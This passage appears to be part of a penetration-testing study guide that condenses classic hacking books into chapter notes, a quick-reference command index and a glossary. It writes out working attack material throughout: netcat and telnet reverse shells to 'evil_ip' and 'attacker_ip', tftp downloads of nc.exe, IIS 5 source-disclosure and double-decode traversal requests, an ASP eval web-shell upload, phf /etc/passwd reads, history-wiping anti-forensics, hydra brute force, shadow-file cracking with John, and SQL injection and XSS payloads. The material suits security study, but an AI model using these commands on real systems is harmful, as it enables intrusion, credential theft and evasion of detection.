host -l -v -t any acme.net
host -l acme.net | cut -f 4 -d " " > /tmp/ip_out
host acme.net

# Traceroute using ICMP (-I), TCP SYN (-T), or fixed destination port 53 (-p 53)
sudo traceroute -I acme.net
sudo traceroute -T -p 53 10.10.10.2
sudo traceroute -U -p 53 10.10.10.2
```

### 2. Hacking UNIX (Chapter 8 of *Hacking Exposed*)
* **Remote Access:**
  * *Brute Force:* SSH, Telnet, FTP, POP, SNMP.
  * *Data-Driven Attacks:* Buffer overflows (e.g., `echo "vrfy $(perl -e 'print "a" x 1000')" | nc target.com 25`) and Input Validation / CGI metacharacter attacks (`/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd`).
  * *Shoveling a Shell Back:* Xterm display (`xterm -ut -display evil_ip:0.0`), Reverse Telnet (`telnet evil_ip 80 | /bin/sh | telnet evil_ip 25`), or Netcat (`nc -e /bin/sh evil_ip 80`).
  * *Common Remote Services:* TFTP (port 69), FTP (`wu-ftpd` site exec format string), Sendmail (`~/.forward` pipe execution), RPC (`rpcinfo -p`, `rpc.ttdbserverd`, `rpc.cmsd`, `rpc.statd`), NFS (`showmount -e`, `nfsshell` UID/GID 2 `bin` spoofing), X11 (`xhost +`, `xscan` keylogging, `xlswins`, `xwatchwin`, `xwd`/`xwud` screen capture), and BIND DNS (`dig @target version.bind chaos txt`, NXT record overflow).
* **Local Access (Privilege Escalation) & Post-Exploitation:**
  * *Password Cracking:* Crack 5.0a and John the Ripper.
  * *Local Buffer Overflows:* `LC_MESSAGES` in `libc` on SUID binaries.
  * *Symlink Attacks:* Linking temporary files created by SUID binaries (`ln -s /etc/passwd /var/dt/appconfig/appmanager/generic-display-0`).
  * *Race Conditions, Core-File Manipulation (`ulimit -c 0`), Shared Libraries (`LD_PRELOAD`), Kernel Flaws, SUID/SGID & World-Writable Files, and Shell `IFS` Manipulation.*
  * *Rootkits, Sniffers, Log Cleaning (`wtmp`, `.bash_history`), and Loadable Kernel Module (LKM) Rootkits (`knark`, `adore`).*

```bash
# Shovel a reverse shell using Netcat or Two-Window Reverse Telnet
# On Attacker (Ubuntu 24.04):
sudo nc -lnvp 80
sudo nc -lnvp 25
# On Target:
/bin/telnet attacker_ip 80 | /bin/sh | /bin/telnet attacker_ip 25

# Enumerate RPC services and exported NFS shares
rpcinfo -p target_ip
showmount -e target_ip
sudo mount -t nfs target_ip:/ /mnt

# Check BIND DNS version
dig @10.1.1.100 version.bind chaos txt

# Find all SUID (04000), SGID (02000), and World-Writable (-perm -2) files on Ubuntu 24.04
find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -perm -02000 -ls 2>/dev/null
find / -perm -2 -type f -print 2>/dev/null

# Inspect binaries for hardcoded /tmp usage (Symlink attack candidates)
strings /bin/* /usr/sbin/* 2>/dev/null | grep tmp

# Disable core dumps to prevent shadow hash leakage
ulimit -c 0
ulimit -a

# Verify binary integrity on Ubuntu 24.04 (Debian/Ubuntu equivalent of rpm -Vvp)
sudo apt install -y debsums
sudo debsums -s

# Anti-forensics: Disable shell history in current session or link .bash_history to /dev/null
unset HISTFILE; unset SAVEHIST
ln -sf /dev/null ~/.bash_history

# Forensics: Preserve all 3 UNIX timestamps (Access, Modification, Status Change) before inspecting
ls -alRu / > /mnt/external/timestamp_access.txt
ls -alRc / > /mnt/external/timestamp_modification.txt
ls -alR  / > /mnt/external/timestamp_creation.txt
```

### 3. Linux Password Cracking (Chapter 9 of *Hacking Linux Exposed*)
* **Linux Password Mechanics:** `/etc/passwd` (world-readable) vs. `/etc/shadow` (readable only by `root`). Algorithms include DES `crypt(3)` (13 chars, 2-char salt from `[a-zA-Z0-9./]`, max 8-char password), MD5 (`$1$...`), Blowfish (`$2a$...`), and modern Ubuntu 24.04 SHA-512 (`$6$...`) / yescrypt (`$y$...`).

```bash
# Convert between unshadowed and shadowed passwords, and verify integrity on Ubuntu 24.04
sudo pwck
sudo pwconv

# Enforce 90-day password expiration using chage
sudo chage -M 90 username

# Combine /etc/passwd and /etc/shadow and crack with John the Ripper on Ubuntu 24.04
sudo unshadow /etc/passwd /etc/shadow > /tmp/passwd.txt
sudo chmod 600 /tmp/passwd.txt
john /tmp/passwd.txt
john --single /tmp/passwd.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/passwd.txt
john --incremental /tmp/passwd.txt
john --restore
john --show /tmp/passwd.txt
john --show --users:jdoe /tmp/passwd.txt

# Generate Apache HTTP Auth password files
htpasswd -c .htpasswd_file username

# Perl DES crypt() and Random Bomb-Proof Password Generator from Chapter 9
perl -e 'print crypt("IAmGod", "x7") . "\n";'
```

### 4. Windows 2000 Architecture & Hacking IIS 5 (Chapters 2 & 10 of *Hacking Exposed Windows 2000*)
* **Windows Security Model:** SRM (Kernel mode), LSASS, SAM (`%systemroot%\system32\config\sam`), Active Directory (`ntds.dit`), SYSKEY encryption, SIDs (`S-1-5-21-<subauthority>-<RID>`, where RID `500` = `Administrator`, RID `501` = `Guest`), Tokens (`whoami /all`), and LM / NTLM / NTLMv2 / Kerberos authentication.
* **Hacking IIS 5:**
  * *ISAPI Buffer Overflows:* IPP `.printer` (`msw3prt.dll`, `Host:` header overflow exploited via `jill.c`), Indexing Services `.ida`/`.idq` (`idq.dll`, Code Red worm), FrontPage Server Extensions (`fp30reg.dll` / `fp4areg.dll`).
  * *File System Traversal:* Unicode (`..%c0%af..`) and Double Decode (`..%255c..`).
  * *Writing Files to the Server:* Using `tftp.exe -i <attacker_ip> GET nc.exe C:\nc.exe`, copying `cmd.exe` to `cmd1.exe` to bypass `>` redirection restrictions and scripting `ftp.exe -s:C:\ftptmp`, or using `unicodeloader.pl` to upload `upload.asp` and `cmdasp.asp`.
  * *Privilege Escalation (`IUSR_machinename` → `SYSTEM`):* Exploiting `RevertToSelf()` via `InProcessIsapiApps` (`idq.dll`, `httpext.dll`, etc.).
  * *Source Code Disclosure:* Append `+.htr` or `%3f+.htr` (`GET /site1/global.asa+.htr HTTP/1.0`), Webhits `.htw` buffer truncation (`iiscat`), `Translate: f` with trailing backslash (`GET /global.asa\ HTTP/1.0`), and WebDAV `SEARCH` directory listing.

```bash
# Exploit IIS 5 Source Code Disclosure (Translate: f) from Ubuntu 24.04
printf "GET /global.asa\\ HTTP/1.0\r\nTranslate: f\r\n\r\n" | nc -nv 192.168.1.50 80

# Exploit IIS 5 +.htr Source Code Disclosure
printf "GET /site1/global.asa%%3f+.htr HTTP/1.0\r\n\r\n" | nc -nv 192.168.1.50 80

# Exploit IIS 5 Double Decode Traversal to execute dir C:\
printf "GET /scripts/..%%255c..%%255cwinnt/system32/cmd.exe?/c+dir+c:\\ HTTP/1.0\r\n\r\n" | nc -nv 192.168.1.50 80

# Exploit IIS 5 WebDAV SEARCH Directory Listing from Ubuntu 24.04
cat << 'EOF' | nc -nv 192.168.1.50 80 > output.xml
SEARCH / HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml
Content-Length: 133

<?xml version="1.0"?>
<g:searchrequest xmlns:g="DAV:">
<g:sql>
Select "DAV:displayname" from scope()
</g:sql>
</g:searchrequest>
EOF
```

---

## Appendix B: Master Quick-Reference Command Index

One-line lookup by task. Full context, payload variants, and caveats live in the linked chapter.

### Recon & Application Mapping
```bash
curl -k -i https://target.com/robots.txt                                    # [Ch.4] check robots.txt + headers
whois -h whois.arin.net "10.10.10.0"                                        # [Appx.A] ARIN network block lookup
dig @10.10.10.2 acme.net axfr > /tmp/zone_out                               # [Appx.A] DNS zone transfer (AXFR)
nikto -h http://target.com -Cgidirs /cgi/ -404 "Page Not Found" -vhost target.com   # [Ch.4] default-file/vuln scan
gobuster dir -u https://target.com/ -w /usr/share/wordlists/dirb/common.txt \
  -x php,asp,aspx,jsp,bak,old,inc,txt,tmp -k                                 # [Ch.4] directory/file brute-force
ffuf -u "https://target.com/login?FUZZ1=FUZZ2" \
  -w debug_names.txt:FUZZ1 -w debug_values.txt:FUZZ2 -mc all -fc 404        # [Ch.4] hidden-parameter fuzzing
```

### Authentication & Brute Force
```bash
hydra -t 32 -L enumerated_users.txt -P top_passwords.txt target.com http-post-form \
  "/auth/16/Default.ashx:username=^USER^&password=^PASS^:Login failed"      # [Ch.6] breadth-first login brute force
curl -k -i -X POST https://target.com/login.ashx -d "username=admin"       # [Ch.6] fail-open (missing password) test
```

### Session & Access Control Testing
```bash
curl -k -i -X HEAD "https://target.com/admin/createUser?username=hacker&role=admin" \
  -H "Cookie: SessionId=LOW_PRIV_USER_TOKEN"                                 # [Ch.8] HTTP verb tampering (HEAD bypass)
curl -k -i "https://target.com/auth/472/CreateUser.ashx" \
  -H "Referer: https://target.com/auth/472/Admin.ashx"                      # [Ch.8] Referer-based access-control bypass
```

### SQL / NoSQL Injection
```bash
sqlmap -u "http://wahh-app.com/employees.asp?Empno=7369" -p Empno --union-use --sql-shell   # [Ch.9] confirm UNION SQLi → SQL shell
```
Key payloads: `admin'--` (login bypass) · `' UNION SELECT NULL--` (column-count probe) · `' AND 1=(SELECT ...)--` (error-based extraction). Full cross-DBMS cheat sheet in [Chapter 9](#chapter-9-attacking-data-stores-sql-nosql-xpath-ldap).

### XSS & Client-Side Testing
Core vector: `<script>alert(1)</script>`. Filter-bypass families (event handlers, encodings, UTF-7, VBScript) are catalogued in [Chapter 12](#chapter-12-attacking-users-cross-site-scripting-xss).
```bash
sendmail -t victim@target.com < xss_email.txt                               # [Ch.12] stored-XSS test via raw MIME email
```

### Automation / Custom Fuzzing
```bash
javac JAttack.java && java JAttack                                          # [Ch.14] compile & run the enumeration/fuzzing harness
```
Bash + Netcat identifier-enumeration loop and the full `JAttack.java` source are in [Chapter 14](#chapter-14-automating-customized-attacks).

### Application Server & WebDAV Testing
```bash
curl -i -X PUT http://target.com/public/shell.txt -d '<% eval request("cmd") %>'   # [Ch.18] WebDAV PUT upload test
curl -i http://target.com/ -H "Host: bogus.invalid"                         # [Ch.18] virtual-host misconfiguration test
```

### Source Code Review
```bash
grep -rnEi "(bug|problem|bad|hope|todo|fix|overflow|crash|inject|xss|trust)" /path/to/source/   # [Ch.19] security-comment grep
grep -rnEi '"(SELECT|INSERT|UPDATE|DELETE| AND| OR| WHERE| ORDER BY) ' /path/to/source/          # [Ch.19] concatenated-SQL grep
```

### Toolkit Scripts
`sql.pl` (Perl blind error-based SQLi extractor), a Bash/curl `<title>` harvester, and an `stunnel4` SSL-wrapper config — all in [Chapter 20](#chapter-20-a-web-application-hackers-toolkit).

### Network & Host Enumeration (Hacking Exposed)
```bash
rpcinfo -p target_ip                                                        # [Appx.A.2] enumerate RPC services
showmount -e target_ip                                                      # [Appx.A.2] enumerate exported NFS shares
find / -type f -perm -04000 -ls 2>/dev/null                                 # [Appx.A.2] find SUID binaries
find / -type f -perm -02000 -ls 2>/dev/null                                 # [Appx.A.2] find SGID binaries
sudo debsums -s                                                             # [Appx.A.2] verify installed-package integrity
```

### Password Cracking
```bash
sudo unshadow /etc/passwd /etc/shadow > /tmp/passwd.txt && sudo chmod 600 /tmp/passwd.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/passwd.txt            # [Appx.A.3] wordlist-based John the Ripper crack
```

### Legacy Windows / IIS 5
```bash
printf "GET /global.asa\\ HTTP/1.0\r\nTranslate: f\r\n\r\n" | nc -nv 192.168.1.50 80   # [Appx.A.4] Translate:f source disclosure
```


---

## Appendix C: Glossary of Key Terms

| Term | Meaning |
| :--- | :--- |
| **XSS** | Cross-Site Scripting — injecting attacker JavaScript into pages viewed by other users. |
| **CSRF** | Cross-Site Request Forgery — forcing a victim's browser to submit an unwanted authenticated request. |
| **SQLi** | SQL Injection — manipulating a back-end SQL query via unsanitized input. |
| **XXE** | XML External Entity injection — abusing XML parsers to read local files or trigger SSRF. |
| **SSRF** | Server-Side Request Forgery — making the server issue attacker-controlled outbound requests. |
| **IDOR** | Insecure Direct Object Reference — accessing another user's resource by guessing/altering an identifier. |
| **LFI / RFI** | Local / Remote File Inclusion — including a local or attacker-hosted file for execution or disclosure. |
| **HPP / HPI** | HTTP Parameter Pollution / Injection — abusing duplicate or injected request parameters. |
| **CBC / ECB** | Cipher Block Chaining / Electronic Codebook — symmetric-cipher block modes with distinct tampering weaknesses (bit-flipping vs. block cut-and-paste). |
| **DAC / RBAC** | Discretionary / Role-Based Access Control — authorization models used in defense-in-depth. |
| **WAF** | Web Application Firewall — a filtering layer that inspects/blocks malicious HTTP traffic. |
| **OOB** | Out-of-Band (channel) — exfiltrating data via DNS, HTTP, or SMB rather than the direct response. |
| **SOP / CORS** | Same-Origin Policy / Cross-Origin Resource Sharing — the browser's cross-domain access model and its controlled relaxation. |
| **PRNG** | Pseudo-Random Number Generator — e.g., a linear congruential generator (LCG) used (insecurely) for session tokens. |
| **OSRF** | On-Site Request Forgery — injecting a relative URL that executes an action on the *same* site. |
| **LSO** | Local Shared Object — a Flash "cookie" used for persistent client-side storage/tracking. |
| **SUID / SGID** | Set-User/Group-ID bits on UNIX binaries that run with the file owner's/group's privileges. |
| **AXFR** | DNS zone transfer — bulk export of a DNS zone's records, often misconfigured to allow anyone to request it. |
| **RID** | Relative Identifier — the final component of a Windows SID (e.g., `500` = built-in Administrator). |
| **HPP (back-end)** | See HPP/HPI above — also used specifically for front-end-to-back-end request parameter smuggling. |
| **WSDL** | Web Services Description Language — an XML document describing a SOAP web service's interface. |
